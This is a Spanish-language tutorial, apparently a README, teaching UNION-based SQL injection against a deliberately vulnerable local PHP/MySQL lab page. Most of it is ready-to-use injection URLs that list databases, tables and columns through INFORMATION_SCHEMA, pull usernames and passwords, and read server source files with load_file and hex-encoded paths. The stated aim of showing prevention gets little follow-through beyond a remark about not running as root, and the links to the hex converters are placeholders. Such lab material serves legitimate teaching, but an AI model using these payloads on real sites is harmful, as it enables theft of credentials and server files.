Antes de comenzar este "How to" esta dedicado a SixP4ck3r y al HackMeetin.

# SqlInjection
1.- Definicion 
2.- Objetivos
3.- A montar el laboratorio(XAMPP, WAMP, AppServ)
4.- Extras 
5.- SQL y Mysql
6.- Uso de Funciones
7.- Sacando Base de Datos
8.- Sacando las tablas
9.- Sacando las columnas
10.- Sacando informacion
11.- Danger load_file & into outfile


## 1.- Definicion
Wiki:	http://es.wikipedia.org/wiki/SQL_injection
Inyección SQL es un método de infiltración de código intruso que se vale de una vulnerabilidad informática presente en una aplicación en el nivel de validación de las entradas para realizar operaciones sobre una base de datos. 

# 2.- Objetivos
- Consultas SQL
- Una introduccion a SQL Injection
- Saber usar mejor las consultas SQL
- Ver como prevenir este ataque

# 3.- XAMPP, WAMPP, AppServ
Si tienes instalado cualquiera de estos tres saltate esta parte.
Para poder aprender SQL Injection debemos tener listo la maquina, convertirla en un pequeño server y esto gracias a XAMPP, WAMP, AppServ, etc;
Al instalara cualquiera de los tres tendras apache,php y mysql llo que se necesita.
- XAMPP - Linux, MAC-OS, windows (http://www.apachefriends.org/es/xampp.html) 
- WAMP - Windows (http://www.wampserver.com/en/ )
- AppServ - Windows (http://www.appservnetwork.com/)

Ok, al instalarlo solo ingresa con tu navegador faovrito a la direccion: 
	`http://127.0.0.1/`
	o
	`http://localhost/`

Luego crear una carpeta __pagina__ en la directorio de:
> XAMPP->htdocs
> WAMP->www
> AppServ->www

Luego ingresar al PhpMyAdmin y copiar el contenido del archivo __sqli.sql__, y wala tendran su pagina para jugar.


## 4.- Extras
a) Saber que esel phpMyAdmin
b) Saber convertir manualmente de hexa a decimal y viceversa
c) Descargar conversor hexadecimal:
 [Hexa in Python](https://dillinger.io/)  [Hexa in Java](https://dillinger.io/)
Esos dos codes sirve para convertir todo en su equivalente hexadecimal.

## 5.- SQL y Mysql
Primero entremos a mysql
Segundo seleccionamos la base de datos sqli.
Y ahora veamos la logica de SQL Injection
__i)__
```sql 
select * from usuarios; 
```
Con esta consulta seleccionamos todo el contenido de la tabla usuarios.
	
__ii)__
```sql
select * from usuarios where id_user=1;
```
Con esta consulta seleccionamos la informacion del usuarios cuyo id sea igual a 1. Esto es verdad.

__iii)__
```sql
select * from usuarios where id_user=-1;
```
Con esta consulta seleccionamos la informacion del usuarios cuyo id sea igual a -1. Esto es falso.
Bien la cuestion es que cuando se hace una consulta desde una pagina web se da mayormente la ii donde es verdad y me mostrara la informacion de 1.
Pero al meter un dato falso como -1. No da nada entonces si tenemos una consulta falsa  y podemos unirla a una consulta verdadera con UNION.
Ej.
```sql
select * from usuarios where id_user=-1 union select 1,2,3,4;
```
Esta consulta nos mostrara los numeros del 1 al 4; Por que:
> select * from usuarios where id_user=-1 -> Esta consulta es falsa
> UNION ALL -> uniendo a a otra consulta
> select 1,2,3,47 -> Esta consulta es verdadera

me mostrara la consulta verdadera; 1,2,3,4 represetan a cada una de las columnas de de la tabla USUARIOS.

O sea podemos dar un valor falos uniendolo a una consulta verdadera y asi que nos muestra la informacion que consultaremos con nuestra sql insertado.
Para poder sacara el jugo a las consultas SQL es necesario saber funciones propias y la composicion estructural de cada SGBD(Sistema de Gestion de Base de Datos).

Aclarando al unir otra consulta en mysql no hace comparacion de columnas osea:
Si seleccionas una tabla compuesta cadenas la otra consulta no importa como este compuesta.
Solo esto es mysql en otros sgbd's no es asi.

Como ven declaramos la primera consulta como falsa y la unimos a otra consulta verdadera.
Ahora para poder realizar ataques de SQL Injection debemos conocer las sentencias basicas de SQL y en MySQl.
Estrutura de MySQL juegue y revise las base de datos mysql y information_schema
Funciones de MySQL vean y chequeen la pagina oficial: http://dev.mysql.com/doc/refman/5.1/en/  

## 6.- Uso de Funciones

Ok ahora vamos a la pagina de prueva que como ven es una pagina comun y correinte como las demas paginas
Leemos la primera pagina y como pueden ver es solo es una noticia comun.
Ok en la barra de direcciones en detalle.php?id=2 pondremos un dato absurdo que nos lanzara un error talvez como __detalle.php?id='__


> __Warning: mysql_fetch_array() expects parameter 1 to be resource,__
> __boolean given in C:\wamp\www\SQLi\detalle.php on line 43__

como pueden ver ese es el error que buscamos esto es cuando hay una mala sintaxis en la consulta OJO la consulta es lo que tenemos que atacar por lo tanto lo primero hay que imaginar como podria estar hecha esa consulta y luego poner un dato que con valor falso.
		
Como pueden observar no da ningun resultado, luego hay que ver de cuantas columnas esta compuesta esa tabla para ello lo uniremos a una consulta verdadera con la colocacion del 1 hasta donde llegue.
		
Ok como puede ver en la imagen la tabla consta de 7 columnas de que tipo aun no sabemos pero pronto. Por ahora nos queda suplantar algun numero de la consulta verdadera con cosas que nos interesan como por ejemplo 
El usuarios y la base de datos.
```sql
select user(); -> Da el nombre del usuario conectado

select database(): -> Da el nombre de la base de datos seleccionado 
```
Reemplazando 5 y 6 por __user()__ y __database()__
 
Grave error __root__, en mysql lo recomendable es crear usuarios, con control de base de datos especificas y con pocos privilegios.

## 7.- Sacando Base de Datos
Como en el ejemplo estan usando root en la base de datos entonces tenemos la opcion y el poder de ver cualquier base de datos.
Para tal cosa debemos de ver la base de datos llamada __INFORMATION_SCHEMA__ (Valido para mysql 5 pa adelante)
tabla __SCHEMATA__ y la columna __SCHEMA_NAME__ esto lo pueden en e phpmyadmin de XAMPP, WAMP, AppServ u otro.
		
Ok la consulta entonces seria ocupando la columna 4:

* Consulta: Contando cuantas base de datos son:

Consulta falsa
```html
http://127.0.0.1/SQLi/detalle.php?id=-1+union+
```
consulta verdadera
```sql
select+1,2,3,count(SCHEMA_NAME),5,6,7+from+INFORMATION_SCHEMA.SCHEMATA
```
Todo
```html
http://127.0.0.1/SQLi/detalle.php?id=-1+union+select+1,2,3,count(SCHEMA_NAME),5,6,7+from+INFORMATION_SCHEMA.SCHEMATA
```

Nos da 7 eso quiere decir que tenemos 7 base de datos como podemos verlos todos en uno para eso usaremos la funcion __group_concat__

__Consulta falsa__
```html
http://127.0.0.1/SQLi/detalle.php?id=-1+union+
```
__Consulta verdadera__
```htl
select+1,2,3,group_concat(SCHEMA_NAME),5,6,7+from+INFORMATION_SCHEMA.SCHEMATA		
```

__Todo__
```html
http://127.0.0.1/SQLi/detalle.php?id=-1+union+select+1,2,3,group_concat(SCHEMA_NAME),5,6,7+from+INFORMATION_SCHEMA.SCHEMATA
```

## 8.- Sacando las tablas
Ok como ya vimos las base de datos ahora debemos saber cuantas tablas tiene nuestra base de datos SQLi ya que es el objetivo. Primero convertiremos SQLi en hexa decimal, por que al hacer la consulta haremos un WHERE de comparacion y en mysql y otros la comparar dos cadenas deben de estar entre comillas para evitar poner las comillas lo convertiremosen hexa a SQLi con python o java o manulamente.

> DataBase: __INFORMATION_SCHEMA__
> Tabla: __TABLES__
> Colum: __TABLE_NAME, TABLE_SCHEMA__

__0x73716c69__ es sqli en Hexadecimal

__Consulta falsa__
```html
http://127.0.0.1/SQLi/detalle.php?id=-1+union+
```

__consulta verdadera__
```html
select+1,2,3,group_concat(TABLE_NAME),5,6,7+from+INFORMATION_SCHEMA.TABLES+where+TABLE_SCHEMA=0x73716c69
```

__Todo__
```html
http://127.0.0.1/SQLi/detalle.php?id=-1+union+select+1,2,3,group_concat(TABLE_NAME),5,6,7+from+INFORMATION_SCHEMA.TABLES+where+TABLE_SCHEMA=0x73716c69
```

## 9.- Sacando las columnas
Ok ya tenemos las dos tablas noticias y usuarios ahora a sacar las columnas pero de quien en este caso de la tabla usuarios, donde debemos convertir en hexa el nombre de la talb usuarios = 0x7573756172696f73
> DataBase: __INFORMATION_SCHEMA__
> Tabla: __COLUMNS__
> Colum: __COLUMN_NAME, TABLE_NAME__

__Consulta falsa__
```html
http://127.0.0.1/SQLi/detalle.php?id=-1+union+
```

__Consulta verdadera__
```html
select+1,2,3,group_concat(COLUMN_NAME),5,6,7+from+INFORMATION_SCHEMA.COLUMNS+where+TABLE_NAME=0x7573756172696f73
```

__Todo__
```html
http://127.0.0.1/SQLi/detalle.php?id=-1+union+select+1,2,3,group_concat(COLUMN_NAME),5,6,7+from+INFORMATION_SCHEMA.COLUMNS+where+TABLE_NAME=0x7573756172696f73
```


## 10.- Sacando informacion
Ok ya tenemos toda la info de la Base de datos SQLI y la tabla USUARIOS y sus columnas ID_USER,NOMBRES,USUARIO,CLAVE, bien solo hace falta sacar la consulta.

> DataBase: __sqli__
> Tabla: __USUARIOS__
> Colum: __ID_USER,NOMBRES,USUARIO,CLAVE__

__Consulta falsa__
```html
http://127.0.0.1/SQLi/detalle.php?id=-1+union+
```

__Consulta verdadera__
```sql
select+1,2,3,4,usario,clave,7+from+SQLI.USUARIOS+limit+0,1
select+1,2,3,4,usario,clave,7+from+SQLI.USUARIOS+limit+1,1
select+1,2,3,4,usario,clave,7+from+SQLI.USUARIOS+limit+2,1
```

__Todo__
```html
http://127.0.0.1/SQLi/detalle.php?id=-1+union+select+1,2,3,4,usario,clave,7+from+SQLI.USUARIOS+limit+0,1
http://127.0.0.1/SQLi/detalle.php?id=-1+union+select+1,2,3,4,usario,clave,7+from+SQLI.USUARIOS+limit+1,1
http://127.0.0.1/SQLi/detalle.php?id=-1+union+select+1,2,3,4,usario,clave,7+from+SQLI.USUARIOS+limit+2,1
```

## 11.- Danger load_file
Ok aqui lo mas interesante aqui si debemos saber un poco el lenguage en el que esta programado la pagina maromente php, por que lo que aremos es coger codigo fuente de la pagina para asi leerla y poder bajar si gustamos toda la pagina y otras cosas que les dejo a la imaginacion todo se puede si uno se lo iamgina.

Para ello usaremos la funcion load_file de mysql.
```sql
select load_file('direccion_del_archivo');
```

Facil no pero no tanto primero debemos saber la direccion y el nombre del archivo para eso el fallo que al principio aparecio.

> __Warning: mysql_fetch_array() expects parameter 1 to be resource,__
> __boolean given in C:\wamp\www\SQLi\detalle.php on line 43__

Esto es lo que nos interesa C:\wamp\www\SQLi\detalle.php 
en hexa es 0x433a5c77616d705c7777775c53514c695c646574616c6c652e706870

Ok pero si locargamos lo interpretara como codigo y no podremos leerlo para eso usaremos la funcion replace de mysql 
```sql
select replace('Text1', '1', 'o');
```
Reemplazara 1 por o; Osea reemplazaremos < por ^ asi no lo reconocera como codigo HTML ni Php y al cambiar en nuestro editor favorito el reeplazamiento sera mas facil.

link:
```html
C:\wamp\www\SQLi\detalle.php
0x433a5c77616d705c7777775c53514c695c646574616c6c652e706870
```html
< 
0x3c

^
0x5e


__Consulta falsa__
```html
http://127.0.0.1/SQLi/detalle.php?id=-1+union+
```

__Consulta verdadera__
```sql
select+1,2,3, replace(load_file(0x433a5c77616d705c7777775c53514c695c646574616c6c652e706870), 0x3c, 0x5e) ,5,6,7
```
__Todo__
```html
http://127.0.0.1/SQLi/detalle.php?id=-1+union+select+1,2,3,replace(load_file(0x433a5c77616d705c7777775c53514c695c646574616c6c652e706870), 0x3c, 0x5e),5,6,7
```

Hasta ahi todo facil si lo practican una y otra ves y veran que todo es solo logica.
Por si se puede sacara toda la info de las bases de datos tablas y columnas en una sola consulta.
Saludos.. y happy hacking.
